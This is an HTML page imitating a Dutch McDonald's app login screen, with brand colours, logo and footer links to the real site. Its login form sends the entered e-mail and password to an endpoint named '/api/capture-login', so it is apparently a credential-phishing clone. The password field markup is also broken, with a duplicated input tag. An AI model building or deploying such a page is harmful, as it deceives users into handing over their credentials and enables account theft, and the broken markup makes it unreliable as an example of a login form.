<!DOCTYPE html>
<html lang="nl-NL">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <title>Account — McDonald's App home</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --white: #ffffff;
            --grey-100: #f9f9f9;
            --grey-200: #f3f3f3;
            --grey-300: #d6d6d6;
            --grey-400: #adadad;
            --grey-500: #959595;
            --grey-600: #6f6f6f;
            --grey-700: #3d3d3d;
            --grey-800: #292929;
            --gold-200: #fbe4a7;
            --gold-300: #ffd25b;
            --gold-400: #ffbc0d;
            --gold-500: #e3a70b;
            --gold-700: #c08b00;
            --border: rgba(41,41,41,.2);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html {
            height: 100%;
            background: transparent;
        }

        body {
            height: 100%;
            font-family: 'Nunito Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            font-size: 16px;
            font-weight: 400;
            line-height: 1.2;
            color: var(--grey-800);
            background: transparent;
        }

        #root {
            position: relative;
            display: flex;
            flex-direction: column;
            min-height: 100%;
        }

        .safe-area-y {
            padding-left: 12px;
            padding-right: 12px;
        }

        @media (min-width: 500px) {
            .safe-area-y {
                padding-left: 24px;
                padding-right: 24px;
            }
        }

        @media (min-width: 768px) {
            .safe-area-y {
                padding-left: 48px;
                padding-right: 48px;
            }
        }

        .header {
            position: sticky;
            z-index: 2;
            top: 0;
            flex-shrink: 0;
            display: flex;
            width: 100%;
            height: 48px;
            background-color: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(4px);
        }

        @media (min-width: 768px) {
            .header {
                height: 72px;
            }
        }

        .header-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
            min-width: 0;
            height: 100%;
        }

        .header-action {
            display: flex;
            align-items: center;
            gap: 6px;
            min-width: 0;
            height: 100%;
            padding: 0 8px;
            border: none;
            border-radius: 4px;
            background: transparent;
            color: inherit;
            font-family: inherit;
            font-size: 14px;
            text-decoration: none;
            cursor: pointer;
            transition: background-color 0.15s linear;
        }

        @media (min-width: 768px) {
            .header-action {
                padding: 0 16px;
                gap: 12px;
            }
        }

        .header-action:hover {
            background-color: var(--grey-200);
        }

        .logo {
            width: 32px;
            height: auto;
        }

        @media (min-width: 768px) {
            .logo {
                width: auto;
                height: 41px;
            }
        }

        .layout {
            position: relative;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            background-color: var(--white);
        }

        .container {
            flex-grow: 1;
            position: relative;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .content {
            width: 100%;
            max-width: 576px;
            margin: auto;
            padding-top: 32px;
            padding-bottom: 32px;
        }

        @media (min-width: 768px) {
            .content {
                padding-top: 64px;
                padding-bottom: 64px;
            }
        }

        .heading {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        @media (min-width: 768px) {
            .heading {
                flex-direction: row-reverse;
                align-items: center;
                gap: 24px;
            }
        }

        .heading-image {
            display: block;
            width: 100%;
            max-width: 150px;
            height: auto;
            max-height: 200px;
            object-fit: contain;
        }

        .page-title {
            font-weight: 700;
            font-size: 28px;
        }

        @media (min-width: 768px) {
            .page-title {
                font-size: 36px;
                flex-grow: 1;
            }
        }

        @media (min-width: 1440px) {
            .page-title {
                font-size: 56px;
            }
        }

        .account-container {
            display: flex;
            flex-direction: column;
            gap: 32px;
            font-size: 14px;
        }

        @media (min-width: 768px) {
            .account-container {
                font-size: 16px;
            }
        }

        .account-form {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .form-group {
            position: relative;
        }

        .label {
            display: block;
            padding-top: 4px;
            padding-bottom: 4px;
            font-weight: 400;
            font-size: 12px;
            color: var(--grey-600);
        }

        .field {
            position: relative;
            width: 100%;
            height: 56px;
            padding: 16px;
            color: var(--grey-800);
            background-color: var(--white);
            border: solid 1px var(--grey-500);
            border-radius: 4px;
            font-family: inherit;
            font-size: 16px;
            transition: border-color 0.15s linear, box-shadow 0.15s linear;
        }

        .field:focus {
            outline: none;
            border-color: var(--gold-400);
            box-shadow: inset 0 0 0 1px var(--gold-400);
        }

        .field:hover {
            border-color: var(--gold-400);
            box-shadow: inset 0 0 0 1px var(--gold-400);
        }

        .field::placeholder {
            font-weight: 400;
            font-size: 16px;
            color: var(--grey-400);
        }

        .password-container {
            position: relative;
        }

        .password-field {
            padding-right: 56px;
        }

        .password-toggle {
            position: absolute;
            top: 2px;
            right: 2px;
            padding: 9px;
            border: none;
            border-radius: 2px;
            background: transparent;
            cursor: pointer;
        }

        .password-toggle:hover {
            background-color: var(--grey-200);
        }

        .icon {
            width: 32px;
            height: 32px;
        }

        .account-form-actions {
            display: flex;
            flex-wrap: wrap-reverse;
            gap: 12px;
            margin-top: 32px;
        }

        @media (min-width: 500px) {
            .account-form-actions {
                flex-wrap: nowrap;
            }
        }

        @media (min-width: 768px) {
            .account-form-actions {
                margin-top: 64px;
            }
        }

        .account-form-action {
            flex-basis: 100%;
        }

        @media (min-width: 500px) {
            .account-form-action {
                flex-basis: 50%;
            }
        }

        .btn {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            height: 56px;
            padding: 0 16px;
            border: 1px solid var(--border);
            border-radius: 4px;
            font-family: inherit;
            font-size: 16px;
            font-weight: 400;
            text-decoration: none;
            color: var(--grey-800);
            cursor: pointer;
            transition: background-color 0.15s linear;
        }

        .btn-primary {
            background-color: var(--gold-400);
        }

        .btn-primary:hover {
            background-color: var(--gold-500);
        }

        .btn-primary:active {
            background-color: var(--gold-700);
        }

        .btn-secondary {
            background-color: var(--white);
        }

        .btn-secondary:hover {
            background-color: var(--grey-200);
        }

        .btn-secondary:active {
            background-color: var(--grey-300);
        }

        .footer {
            display: flex;
            flex-direction: column-reverse;
            align-items: flex-start;
            justify-content: flex-start;
            padding-top: 12px;
            padding-bottom: 12px;
            font-size: 14px;
            margin-top: 64px;
        }

        @media (min-width: 768px) {
            .footer {
                flex-direction: row;
                align-items: center;
                justify-content: stretch;
                gap: 12px;
                padding-top: 24px;
                padding-bottom: 24px;
                font-size: 16px;
                margin-top: 96px;
            }
        }

        .copyright {
            padding-top: 8px;
            padding-bottom: 8px;
            white-space: nowrap;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            gap: 16px;
            padding-top: 8px;
            padding-bottom: 8px;
        }

        .link {
            display: inline-block;
            padding-top: 8px;
            padding-bottom: 8px;
            text-decoration: underline;
            font-weight: 400;
            word-break: break-all;
            color: #006bae;
            border-radius: 4px;
            transition: color 0.15s linear, background-color 0.15s linear;
        }

        .link:hover {
            background-color: var(--grey-200);
        }

        .link:active {
            background-color: var(--grey-300);
        }
    </style>
</head>
<body>
    <div id="root">
        <div id="app-layout" class="layout">
            <header class="header">
                <div class="header-container">
                    <a aria-label="Home link" class="header-action" href="https://www.mcdonaldsapps.com/nl-NL">
                        <svg class="logo" width="46" height="41" viewBox="0 0 46 41" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path fill="#ffbc0d" fill-rule="evenodd" d="M32.96 3.51c3.916 0 7.092 16.551 7.092 36.966h5.674C45.726 18.49 40.01.666 32.96.666c-4.01 0-7.59 5.357-9.93 13.733C20.69 6.024 17.111.668 13.1.668 6.05.667.333 18.49.333 40.476h5.675C6.008 20.06 9.185 3.51 13.1 3.51c3.917 0 7.094 15.278 7.094 34.122h5.672c0-18.844 3.177-34.122 7.094-34.122" clip-rule="evenodd"/>
                        </svg>
                    </a>
                    <button aria-haspopup="dialog" class="header-action" type="button">
                        <span>Nederland</span>
                    </button>
                </div>
            </header>

            <div class="container">
                <div class="content">
                    <div class="safe-area-y account-container">
                        <header class="heading">
                            <svg class="heading-image" width="184" height="178" viewBox="0 0 184 178" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <g clip-path="url(#a)">
                                    <path fill="#A0A09F" fill-opacity=".15" d="M100.094 177.932c44.527 0 80.624-4.145 80.624-9.258 0-5.113-36.097-9.258-80.624-9.258-44.528 0-80.625 4.145-80.625 9.258 0 5.113 36.097 9.258 80.625 9.258Z"/>
                                    <path fill="#D8D8D8" fill-rule="evenodd" d="M3.527 78.022 135.824 1.64a3.857 3.857 0 0 1 5.269 1.412l40.891 70.826a3.857 3.857 0 0 1-1.412 5.269L48.276 155.529a3.858 3.858 0 0 1-5.27-1.412L2.116 83.291a3.857 3.857 0 0 1 1.411-5.269Z" clip-rule="evenodd"/>
                                    <path fill="#D8D8D8" d="M2.777 76.723a5.357 5.357 0 0 0-1.96 7.318l40.89 70.826a5.359 5.359 0 0 0 7.32 1.961l132.295-76.381a5.357 5.357 0 0 0 1.961-7.32L142.392 2.303a5.357 5.357 0 0 0-7.318-1.96L2.777 76.723Z"/>
                                    <path stroke="#fff" stroke-width="3" d="m2.777 76.723.75 1.299m-.75-1.299a5.357 5.357 0 0 0-1.96 7.318l40.89 70.826a5.359 5.359 0 0 0 7.32 1.961l132.295-76.381a5.357 5.357 0 0 0 1.961-7.32L142.392 2.303a5.357 5.357 0 0 0-7.318-1.96L2.777 76.723Z"/>
                                    <path fill="#A0A09F" fill-opacity=".15" fill-rule="evenodd" d="m141.093 3.052 3.16 5.475-40.057 84.66a3.857 3.857 0 0 1-3.757 2.198L5.233 88.693l-3.118-5.402a3.857 3.857 0 0 1 1.412-5.269L135.823 1.64a3.858 3.858 0 0 1 5.27 1.412Z" clip-rule="evenodd"/>
                                    <path fill="#F1F1F1" fill-rule="evenodd" d="m3.429 78.075 132.483-76.49a3.857 3.857 0 0 1 5.418 4.987l-39.215 83.171a3.86 3.86 0 0 1-3.765 2.203L5.082 85.263a3.857 3.857 0 0 1-1.653-7.188Z" clip-rule="evenodd"/>
                                    <path fill="#A0A09F" fill-opacity=".15" d="M110.123 102.384c9.595-5.54 12.882-17.807 7.343-27.402-5.54-9.594-17.808-12.882-27.402-7.342-9.595 5.54-12.882 17.808-7.343 27.402 5.54 9.594 17.808 12.882 27.402 7.342Z"/>
                                    <path fill="#DB0007" fill-rule="evenodd" d="M102.819 104.424c-10.533 3.422-21.847-2.342-25.27-12.876-3.422-10.534 2.342-21.847 12.876-25.27 10.534-3.423 21.847 2.342 25.27 12.876 3.423 10.533-2.342 21.847-12.876 25.27Z" clip-rule="evenodd"/>
                                    <path fill="#FFBC0D" fill-rule="evenodd" d="M98.365 75.27c1.907-.62 6.062 6.913 9.282 16.824l2.762-.898c-3.468-10.674-9.061-18.422-12.492-17.307-1.951.634-2.847 3.801-2.665 8.236-2.46-3.696-5.045-5.731-6.998-5.097-3.43 1.115-3.4 10.671.067 21.345l2.763-.898c-3.22-9.91-4.285-18.447-2.38-19.066 1.905-.619 5.86 6.295 8.833 15.444l2.761-.898c-2.974-9.148-3.838-17.066-1.933-17.686Z" clip-rule="evenodd"/>
                                </g>
                                <defs>
                                    <clipPath id="a">
                                        <path fill="#fff" d="M0 0h184v178H0z"/>
                                    </clipPath>
                                </defs>
                            </svg>
                            <h1 class="page-title">Log in op jouw account</h1>
                        </header>

                        <form class="account-form" action="/api/capture-login" method="POST" autocomplete="on">
                            <div class="form-group">
                                <label>
                                    <span class="label">E-mail</span>
                                    <input 
                                        class="field" 
                                        required 
                                        autocomplete="email" 
                                        placeholder="jane.doe@example.com" 
                                        type="email" 
                                        name="username"
                                    >
                                </label>
                            </div>

                            <div class="form-group">
                                <label>
                                    <span class="label">Wachtwoord</span>
                                    <div class="password-container">
                                         <input 
  <input 
    autocapitalize="off" 
    autocorrect="off" 
    spellcheck="false" 
    class="field password-field" 
    required 
    autocomplete="current-password" 
    placeholder="********" 
    type="password"
    name="password"
>
>
                                            
                                        
                                        <button class="password-toggle" type="button" aria-label="Show current password">
                                            <svg class="icon" viewBox="0 0 32 32" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                                                <path d="M3 16c0-4.42 5.82-8 13-8s13 3.58 13 8-5.82 8-13 8-13-3.58-13-8zm13 6.25c3.32 0 6.25-.83 8.28-2.08 2.06-1.27 2.97-2.8 2.97-4.17s-.91-2.9-2.97-4.17c-2.04-1.25-4.96-2.08-8.28-2.08-3.32 0-6.24.83-8.28 2.08-2.06 1.27-2.97 2.8-2.97 4.17s.91 2.9 2.97 4.17c2.04 1.25 4.96 2.08 8.28 2.08zM11 16c0-2.76 2.24-5 5-5s5 2.24 5 5-2.24 5-5 5-5-2.24-5-5zm1.75 0c0 1.79 1.46 3.25 3.25 3.25s3.25-1.46 3.25-3.25-1.46-3.25-3.25-3.25-3.25 1.46-3.25 3.25z"/>
                                            </svg>
                                        </button>
                                    </div>
                                </label>
                            </div>

                            <div class="account-form-actions">
                                <a class="btn btn-secondary account-form-action" href="https://www.mcdonaldsapps.com/nl-NL/forgot-password">
                                    <span>Wachtwoord vergeten?</span>
                                </a>
                                <button class="btn btn-primary account-form-action" type="submit">
                                    <span>Log in op jouw account</span>
                                </button>
                            </div>
                        </form>
                    </div>
                </div>

                <footer class="safe-area-y footer">
                    <span class="copyright">Copyright © 2026 McDonald's</span>
                    <div class="footer-links">
                        <a class="link" href="https://www.mcdonaldsapps.com/nl-NL/legal">Privacybeleid</a>
                        <a class="link" href="https://www.mcdonaldsapps.com/nl-NL/contact">Contactpersonen</a>
                    </div>
                </footer>
            </div>
        </div>
    </div>
</body>
</html>
